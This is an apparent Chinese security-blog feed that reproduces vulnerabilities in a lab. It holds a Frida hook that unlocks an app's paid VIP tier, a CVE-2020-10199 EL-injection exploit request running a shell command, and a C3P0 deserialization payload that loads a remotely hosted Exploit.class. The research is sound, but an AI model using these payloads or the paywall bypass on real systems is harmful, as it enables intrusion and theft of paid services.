    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到先知师傅一篇android逆向，感觉很有趣，就复现了下，做下记录</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li><h3 id="frida-server"><a href="#frida-server" class="headerlink" title="frida-server"></a>frida-server</h3></li><li><p>Jeb 3.17</p></li><li><p>mumu模拟器</p></li><li><p>某apk</p></li><li><p>Frida-tools</p></li><li><p>FRIDA-DEXDump: <a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">https://github.com/hluwa/FRIDA-DEXDump</a></p></li><li><p>Root 过的android手机</p></li></ol><h2 id="frida-dex-dump"><a href="#frida-dex-dump" class="headerlink" title="frida dex dump"></a>frida dex dump</h2><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>FRIDA-DEXDump:<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><p>选择<a href="https://github.com/frida/frida/releases/download/12.8.20/frida-server-12.8.20-android-x86.xz" target="_blank" rel="noopener">frida-server-12.8.20-android-x86.xz</a></p><p>导入mumu模拟器中，并开启</p><pre><code class="hljs bash">adb push frida-server-12.8.20-android-x86 /data/<span class="hljs-built_in">local</span>/tmpchmod 777 frida-server-12.8.20-android-x86./frida-server-12.8.20-android-x86</code></pre><p>root过的android手机上运行app，执行FRIDA-DEXDump,拿到dex(发现在mumu模拟器上dump到的dex不完整)</p><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> main.<span class="hljs-keyword">py</span></code></pre><p><img src="./image-20200513013257847.png" srcset="/img/loading.gif" alt="image-20200513013257847"></p><h2 id="jeb-逆向分析"><a href="#jeb-逆向分析" class="headerlink" title="jeb 逆向分析"></a>jeb 逆向分析</h2><p>使用jeb 打开dex文件</p><p><img src="./image-20200513013454295.png" srcset="/img/loading.gif" alt="image-20200513013454295"></p><p>跟进com.xxx.bean.UserBean 看用户模块</p><p>isVV为控制vip权限处,hook这里就ok了</p><p><img src="./image-20200513014234131.png" srcset="/img/loading.gif" alt="image-20200513014234131"></p><h2 id="frida-hook"><a href="#frida-hook" class="headerlink" title="frida hook"></a>frida hook</h2><p>Hook.js</p><pre><code class="hljs js"><span class="hljs-keyword">if</span>(Java.available) &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'ok111'</span>);    Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">var</span> application = Java.use(<span class="hljs-string">"android.app.Application"</span>);        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'ok222'</span>);        application.attach.overload(<span class="hljs-string">'android.content.Context'</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">context</span>) </span>&#123;            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'ok333'</span>);            <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">this</span>.attach(context); <span class="hljs-comment">// 先执行原来的attach方法</span>            <span class="hljs-keyword">var</span> classloader = context.getClassLoader(); <span class="hljs-comment">// 获取classloader</span>            Java.classFactory.loader = classloader;            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'ok444'</span>);            <span class="hljs-keyword">var</span> userinfo = Java.classFactory.use(<span class="hljs-string">"com.xxxx.bean.UserBean"</span>);            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"user: "</span> + userinfo);            userinfo.isVV.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            userinfo.getVVLevel.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;                <span class="hljs-keyword">return</span> <span class="hljs-string">"9"</span>;            &#125;                        <span class="hljs-keyword">return</span> result;        &#125;    &#125;);&#125;</code></pre><p>shell1设置端口转发</p><pre><code class="hljs bash"><span class="hljs-comment"># shell1</span>adb forward tcp:1234 tcp:1234</code></pre><p><img src="./image-20200513020007613.png" srcset="/img/loading.gif" alt="image-20200513020007613"></p><p>Shell2开启监听,换到mumu模拟器</p><pre><code class="hljs bash"><span class="hljs-comment"># shell2</span>adb <span class="hljs-built_in">kill</span>-server &amp; adb start-server &amp; adb shellfrida-server-12.8.20-android-x86 -l 0.0.0.0:1234</code></pre><p><img src="./image-20200513015858367.png" srcset="/img/loading.gif" alt="image-20200513015858367"></p><p>shell1开始hook</p><pre><code class="hljs bash">frida -H 127.0.0.1:1234 -f com.iksvl -l hook.js</code></pre><p><img src="./image-20200513020129402.png" srcset="/img/loading.gif" alt="image-20200513020129402"></p><p><code>%resume</code>开启android应用,获得会员权限</p><p>本来想hook改掉钻石数，没成功(哈哈哈)</p><p><img src="./image-20200513020400285.png" srcset="/img/loading.gif" alt="image-20200513020400285"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/7670#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7670#toc-0</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2历史漏洞分析之s2-001</title>
    <link href="/2020/04/24/Struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8Bs2-001/"/>
    <url>/2020/04/24/Struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8Bs2-001/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>相关文件源码：<a href="https://xz.aliyun.com/t/2672" target="_blank" rel="noopener">https://xz.aliyun.com/t/2672</a></p><ol><li><p>配置pom.xml</p><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.struts<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>struts2-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></li></ol><p>2.File-&gt;Artifacts 导入编译后的文件至WEB-INF目录，这步目的就是导入classes目录到web目录执行</p><p><img src="./image-20200424110053273.png" srcset="/img/loading.gif" alt="image-20200424110053273"></p><p>3.tomcat配置local直接导入即可</p><p><img src="./image-20200424110220762.png" srcset="/img/loading.gif" alt="image-20200424110220762"></p><p>4.目录</p><p><img src="./image-20200424105902652.png" srcset="/img/loading.gif" alt="image-20200424105902652"></p><h1 id="分析流程模版"><a href="#分析流程模版" class="headerlink" title="分析流程模版"></a>分析流程模版</h1><ol><li>相关servlet调用流程</li><li>数据流source</li><li>数据流sink</li></ol><h1 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h1><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>版本影响：2.0.1 ~ 2.0.8</p><p>表单字符串使用表达式解析导致注入</p><p>相关执行流程参照如下，减少不必要的debug</p><p>struts2执行流程：<a href="https://blog.csdn.net/snow_7/article/details/51513381" target="_blank" rel="noopener">https://blog.csdn.net/snow_7/article/details/51513381</a></p><p>tomcat FIlter执行流程：<a href="https://zsr.github.io/2017/11/15/tomcat-filter分析/" target="_blank" rel="noopener">https://zsr.github.io/2017/11/15/tomcat-filter%E5%88%86%E6%9E%90/</a></p><p>关注tomcat执行doFilter过滤器后调用struts过滤器</p><h2 id="漏洞原理分析-1"><a href="#漏洞原理分析-1" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>在这个漏洞点，怎么确定source点，如果单纯以request对象来获取，是很冗杂的，用codeql时候会跑飞。因为框架存在很多对request对象包装.所以比较方便针对方法调用。如果能判断出哪个方法取出数据，就确定此为source点.</p><p>由<code>UIBean</code>中<code>this.name</code>赋值上,而该值从jsp文件中获取</p><p><img src="./image-20200424150806578.png" srcset="/img/loading.gif" alt="image-20200424150806578"></p><p>在递归调用会先进行一次判断是否altSyntax是否开启，开启则对s标签进行解析，并对password赋予表达式格式.</p><p><img src="./image-20200424215717774.png" srcset="/img/loading.gif" alt="image-20200424215717774"></p><h3 id="sink"><a href="#sink" class="headerlink" title="sink"></a>sink</h3><p>重新渲染JSP界面后会调用<code>translateVariables</code>函数，循环递归调用栈，当满足表达式要求执行<code>findValue</code>解析表达式，否则则执行</p><pre><code class="hljs java"><span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</code></pre><p>获取下一个栈.</p><p><img src="./image-20200424141411289.png" srcset="/img/loading.gif" alt="image-20200424141411289"></p><p>当执行<code>%{password}</code>表达式直接跟进findValue函数，最后执行<code>OgnlUtil.getValue</code>方法解析表达式，造成命令执行.</p><p><img src="./image-20200424141626364.png" srcset="/img/loading.gif" alt="image-20200424141626364"></p><p>具体实现调用<code>callConstructor</code>初始化调用构造器，执行后进行一次recycle再解析后续表达式字符.</p><p><img src="./image-20200424142230772.png" srcset="/img/loading.gif" alt="image-20200424142230772"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>关闭altSyntax</li><li>取消递归调用，只解析第一层，内嵌表达式返回字符串</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何利用CodeQL挖掘CVE-2020-10199</title>
    <link href="/2020/04/20/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8CodeQL%E6%8C%96%E6%8E%98CVE-2020-10199/"/>
    <url>/2020/04/20/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8CodeQL%E6%8C%96%E6%8E%98CVE-2020-10199/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章首发安全客：<a href="https://www.anquanke.com/post/id/196364" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364</a></p><p>挖掘Java漏洞时候存在一个痛点在已知漏洞点的情况下，如何找到可控点，以及确定一条具体的数据流.</p><p>前几天看到@Alvaro Muñoz 利用codeql挖掘到[CVE-2020-10199]Nexus Repository Manager远程代码执行漏洞.于是就对codeql产生强累的好奇心,怼了几天codeql语法和CVE案例。抠出挖掘该CVE的Ql代码</p><h1 id="Codeql"><a href="#Codeql" class="headerlink" title="Codeql"></a>Codeql</h1><p>对Codeql具体介绍可以参考：<a href="https://help.semmle.com/" target="_blank" rel="noopener">https://help.semmle.com/</a></p><p>使用codeql能够很明确搜索出方法调用的数据流, QL代码编写思路相当于在一个代码数据库中利用编写的逻辑搜索出可能的调用点。重点是确定Souce和Sink搜索逻辑.</p><h1 id="漏洞原理简要分析"><a href="#漏洞原理简要分析" class="headerlink" title="漏洞原理简要分析"></a>漏洞原理简要分析</h1><p>该漏洞是由于未做过滤造成表达式注入,作者确定漏洞点执行函数<code>buildConstraintViolationWithTemplate,</code>其该方法中<code>bean.getMessage()</code>返回结果<code>message</code>并未使用<code>stripJavaEl</code>方法过滤造成表达式注入</p><p><img src="./image-20200413220444280.png" srcset="/img/loading.gif" alt="image-20200413220444280"></p><p>最后调用<code>org.hibernate.validator.internal.engine.messageinterpolation#interpolate</code>,执行插入操作并解析恶意字符串，造成表达式注入.</p><p><img src="./image-20200413224305453.png" srcset="/img/loading.gif" alt="image-20200413224305453"></p><h1 id="HelperBean-bean-message"><a href="#HelperBean-bean-message" class="headerlink" title="HelperBean bean#message"></a>HelperBean bean#message</h1><p>编写Codeql最重要的是先确定数据流的Sink点即污染点字段.这里跟进<code>org.sonatype.nexus.validation.HelperBean#getMessage</code>方法.返回message值.该值经由HelperBean方法传入</p><p><img src="./image-20200413220847960.png" srcset="/img/loading.gif" alt="image-20200413220847960"></p><h2 id="Ql代码"><a href="#Ql代码" class="headerlink" title="Ql代码"></a>Ql代码</h2><p>这里直接给出代码并做简单讲解：搜索出流经HelperBean方法中message字段的数据流</p><p>isSink方法搜索逻辑: 定义参数p,该参数p由被调用的HelperBean方法使用且该p参数名为message</p><p>isSouce方法搜索逻辑：由于不清楚哪里数据源最终经过该sink，所以直接使用source.asExpr()调用所有可能的表达式作为数据流.</p><pre><code class="hljs ql">import javaimport semmle.code.java.dataflow.FlowSourcesclass Config extends DataFlow::Configuration&#123;    Config()&#123;        this &#x3D; &quot;1&quot;    &#125;    override predicate isSource(DataFlow::Node source)&#123;        exists(source.asExpr())     &#125;    override predicate isSink(DataFlow::Node sink)&#123;        exists(            Parameter p | p &#x3D; sink.asParameter() and p.getCallable().getName() &#x3D; &quot;HelperBean&quot; and p.getName() &#x3D; &quot;message&quot;        )    &#125;&#125;from Config config ,DataFlow::PathNode source, DataFlow::PathNode sinkwhere config.hasFlowPath(source, sink)select source.getNode().getLocation(),source,sink</code></pre><h2 id="搜索结果"><a href="#搜索结果" class="headerlink" title="搜索结果"></a>搜索结果</h2><p>Run Query</p><p><img src="./image-20200413221909980.png" srcset="/img/loading.gif" alt="image-20200413221909980"></p><h1 id="AbstractGroupRepositoriesApiResource-validateGroupMembers"><a href="#AbstractGroupRepositoriesApiResource-validateGroupMembers" class="headerlink" title="AbstractGroupRepositoriesApiResource#validateGroupMembers"></a>AbstractGroupRepositoriesApiResource#validateGroupMembers</h1><p>根据搜索结果，这里最可疑的<em>souce<em>就是</em>AbstractGroupRepositoriesApiResource:92</em>.点击该结果跟进，Codeql很友好对污染点respositoryName进行标记。向上溯源得到<code>respositoryName</code>值最终由<code>request</code>中获取.</p><p><img src="./image-20200413222428423.png" srcset="/img/loading.gif" alt="image-20200413222428423"></p><h2 id="Ql代码-1"><a href="#Ql代码-1" class="headerlink" title="Ql代码"></a>Ql代码</h2><p>现在就是需要确定<code>AbstractGroupRepositoriesApiResource#validateGroupMembers()</code>方法由哪里调用.</p><p>isSink方法搜索逻辑：定义参数p,该参数p由被调用的<code>validateGroupMembers</code>方法使用且该p参数名为request</p><p>isSouce方法搜索逻辑：这里souce原本是用Codeql自带<code>RemoteFlowSource</code>获取，但是发现并没有结果。所以这里直接用souce.asExpr()搜索全局表达式。</p><pre><code class="hljs scala"><span class="hljs-keyword">import</span> java<span class="hljs-keyword">import</span> semmle.code.java.dataflow.<span class="hljs-type">FlowSources</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DataFlow</span></span>::<span class="hljs-type">Configuration</span>&#123;    <span class="hljs-type">Config</span>()&#123;        <span class="hljs-keyword">this</span> = <span class="hljs-string">"1"</span>    &#125;    <span class="hljs-keyword">override</span> predicate isSource(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> source)&#123;       exists(source.asExpr())       &#125;    <span class="hljs-keyword">override</span> predicate isSink(<span class="hljs-type">DataFlow</span>::<span class="hljs-type">Node</span> sink)&#123;        exists(            <span class="hljs-type">Parameter</span> p | p = sink.asParameter() and p.getCallable().getName() = <span class="hljs-string">"validateGroupMembers"</span> and p.getName() = <span class="hljs-string">"request"</span>                    )    &#125;&#125;<span class="hljs-comment">// 得到可能可控的函数</span>from <span class="hljs-type">Config</span> config ,<span class="hljs-type">DataFlow</span>::<span class="hljs-type">PathNode</span> source, <span class="hljs-type">DataFlow</span>::<span class="hljs-type">PathNode</span> sinkwhere config.hasFlowPath(source, sink)select source, sink</code></pre><h2 id="搜索结果-1"><a href="#搜索结果-1" class="headerlink" title="搜索结果"></a>搜索结果</h2><p>Run Query</p><p><img src="./image-20200413224522324.png" srcset="/img/loading.gif" alt="image-20200413224522324"></p><p>其中<code>GolangGroupRepositoriesApiResource</code>就是该CVE调用的可控点.</p><p><img src="./image-20200413224422240.png" srcset="/img/loading.gif" alt="image-20200413224422240"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://help.semmle.com/wiki/display/CBJAVA/Override+of+method" target="_blank" rel="noopener">https://help.semmle.com/wiki/display/CBJAVA/Override+of+method</a><br><a href="https://help.semmle.com/QL/ql-explore-queries.html" target="_blank" rel="noopener">https://help.semmle.com/QL/ql-explore-queries.html</a><br><a href="https://help.semmle.com/qldoc/java/" target="_blank" rel="noopener">https://help.semmle.com/qldoc/java/</a> </p><p><a href="https://www.youtube.com/watch?v=irrYp3wdtsw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=irrYp3wdtsw</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype" target="_blank" rel="noopener">https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CodeQl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2020-10199]Nexus Repository Manager远程代码执行漏洞(EL注入)</title>
    <link href="/2020/04/09/CVE-2020-10199-Nexus-Repository-Manager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-EL%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/04/09/CVE-2020-10199-Nexus-Repository-Manager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-EL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexus是一套“开箱即用”的系统不需要数据库，它使用文件系统加Lucene来组织数据。<br>Nexus使用ExtJS来开发界面，利用Restlet来提供完整的REST APIs，通过m2eclipse与Eclipse集成使用。<br>Nexus支持WebDAV与LDAP安全身份认证。<br>Nexus还提供了强大的仓库管理功能，构件搜索功能，它基于REST，友好的UI是一个extjs的REST客户端，它占用较少的内存，基于简单文件系统而非数据库</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>环境搭建：<a href="https://github.com/threedr3am/learnjavabug/tree/93d57c428333f98b5927d02630737e639dcb226b/nexus" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/93d57c428333f98b5927d02630737e639dcb226b/nexus</a></p><ol><li>创建普通账户</li></ol><p><img src="./image-20200408175429086.png" srcset="/img/loading.gif" alt="image-20200408175429086"></p><ol start="2"><li><p>exp</p><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/service/rest/beta/repositories/go/group</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1:8081<span class="hljs-attribute">Content-Length</span>: 297<span class="hljs-attribute">X-Requested-With</span>: XMLHttpRequest<span class="hljs-attribute">X-Nexus-UI</span>: true<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36<span class="hljs-attribute">NX-ANTI-CSRF-TOKEN</span>: 0.7886248393834028<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Origin</span>: http://127.0.0.1:8081<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin<span class="hljs-attribute">Sec-Fetch-Mode</span>: cors<span class="hljs-attribute">Referer</span>: http://127.0.0.1:8081/<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate, br<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<span class="hljs-attribute">Cookie</span>: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=cdde5c4a-06bf-4dbd-b065-70c5fc72dbde<span class="hljs-attribute">Connection</span>: close&#123;  "name": "internal",  "online": true,  "storage": &#123;    "blobStoreName": "default",    "strictContentTypeValidation": true  &#125;,  "group": &#123;    "memberNames": ["$&#123;''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/cve-2020-10199')&#125;"]  &#125;&#125;</code></pre></li></ol><p><img src="./image-20200408180000654.png" srcset="/img/loading.gif" alt="image-20200408180000654"></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>未做过滤造成表达式注入</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过Restful暴露的接口之间可以调用url:/service/rest/beta/repositories/go/group</p><p><img src="./image-20200408204317250.png" srcset="/img/loading.gif" alt="image-20200408204317250"></p><p>注解拦截相应请求方式进入到POST处理逻辑中.也需要做身份验证，所以该漏洞需要一定用户权限</p><p><img src="./image-20200408204502721.png" srcset="/img/loading.gif" alt="image-20200408204502721"></p><p>跟进<code>validateGroupMemebers</code>方法，获取<code>group</code>集合下的<code>MemeberNames</code>参数值，并获取其<code>value</code>值为<code>respositoryName</code></p><p><img src="./image-20200408204854164.png" srcset="/img/loading.gif" alt="image-20200408204854164"></p><p>接着开始构造约束规则上下文,继续跟进到<code>isValid</code>方法.在调用方法<code>buildConstraintViolationWithTemplate</code>对定义的错误模版进行修改。没有对恶意参数进行过滤.</p><p><img src="./image-20200408212521035.png" srcset="/img/loading.gif" alt="image-20200408212521035"></p><p>最后调用<code>org.hibernate.validator.internal.engine.messageinterpolation#interpolate</code>,执行插入操作并解析恶意字符串，造成表达式注入.</p><p><img src="./image-20200408213614272.png" srcset="/img/loading.gif" alt="image-20200408213614272"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>EL表达式执行最终由getValue触发</li><li>分析时候需要晓得每个模块的大致功能</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/threedr3am/learnjavabug/tree/93d57c428333f98b5927d02630737e639dcb226b/nexus" target="_blank" rel="noopener">https://github.com/threedr3am/learnjavabug/tree/93d57c428333f98b5927d02630737e639dcb226b/nexus</a></p><p><a href="https://www.cnblogs.com/magic-zero/p/12641068.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/12641068.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2020-7961] Liferay Portal反序列化RCE复现分析(基于JODD-JsonParser)</title>
    <link href="/2020/04/04/CVE-2020-7961-Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8EJODD-JsonParser/"/>
    <url>/2020/04/04/CVE-2020-7961-Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8EJODD-JsonParser/</url>
    
    <content type="html"><![CDATA[<h1 id="FlexJson-反序列化笔记"><a href="#FlexJson-反序列化笔记" class="headerlink" title="FlexJson 反序列化笔记"></a>FlexJson 反序列化笔记</h1><p>liferay port在6.x版本使用FlexJson顺手学习下</p><h2 id="C3P0-poc构造"><a href="#C3P0-poc构造" class="headerlink" title="C3P0 poc构造"></a>C3P0 poc构造</h2><p>1.打印出poc</p><pre><code class="hljs bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://127.0.0.1:8891/ Exploit</code></pre><p><img src="./image-20200401224105820.png" srcset="/img/loading.gif" alt="image-20200401224105820"></p><ol start="2"><li><p>python起个服务并在当前目录放置Exploit.class</p><pre><code class="hljs bash">python3 -m http.server 8891</code></pre></li></ol><p><img src="./image-20200401224224817.png" srcset="/img/loading.gif" alt="image-20200401224224817"></p><h2 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h2><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>net.sf.flexjson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flexjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><p>漏洞触发点在于执行<code>JSONDeserializer.deserialize</code>方法,对json字符串进行反序列化会调用字段setter方法，并执行其中危险函数操作.</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> flexjson.JSONDeserializer;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flexjsonTest1</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        String json = <span class="hljs-string">"&#123;\"class\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f3132372e302e302e313a383839312f740003466f6f;\"&#125;"</span>;        JSONDeserializer jsonDeserializer = <span class="hljs-keyword">new</span> JSONDeserializer();        <span class="hljs-keyword">try</span> &#123;            jsonDeserializer.deserialize(json);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p><img src="./image-20200401224543781.png" srcset="/img/loading.gif" alt="image-20200401224543781"></p><h2 id="JSONDeserializer-deserialize执行流程分析"><a href="#JSONDeserializer-deserialize执行流程分析" class="headerlink" title="JSONDeserializer.deserialize执行流程分析"></a>JSONDeserializer.deserialize执行流程分析</h2><p>对传入的字符串调用StringReader方法载入,重点关注nextValue方法，该方法对json字符进行解析和存入绑定类中.</p><p><img src="./image-20200401225203273.png" srcset="/img/loading.gif" alt="image-20200401225203273"></p><ol><li><p>先对json字符串的闭合字符进行判断，当读到第一个字符位<code>{</code>，回进入相应的case分支.重点关注parseObject方法(在该方法中就会进行套娃循环执行nextValue),会先创建一个Map类jsonObject,并会相应调用putOnce方法对读取的字符串以key-value的形式存储，方便后续实例化调用.</p><p><img src="./image-20200401230202066.png" srcset="/img/loading.gif" alt="image-20200401230202066"></p></li></ol><p><img src="./image-20200401230027684.png" srcset="/img/loading.gif" alt="image-20200401230027684"></p><ol start="2"><li><p>当读取到字符<code>&quot;</code>时，会执行nextString方法.该方法中会新建StringBuilder用来存放字符.当读取到的字符不满足其他case会进行数组拼接操作append。这里就将<code>&quot;class&quot;</code>字符串存入sb中.接着就会读取到<code>&quot;</code>(闭合的双引号)退出该方法.</p><p><img src="./image-20200401230711503.png" srcset="/img/loading.gif" alt="image-20200401230711503"></p></li><li><p>最重要是存入操作. 取出上一步载入缓冲区的<code>class</code>字符串作为key，接着会判断该key之后的字符是否为<code>:</code>，合法的话就会进行putOnce操作存入jsonObject,在该方法中会在进行一次nextValue读取<code>:</code>之后下一个字符串.执行流程与<code>class</code>字符串获取相同.</p></li></ol><p><img src="./image-20200401231250716.png" srcset="/img/loading.gif" 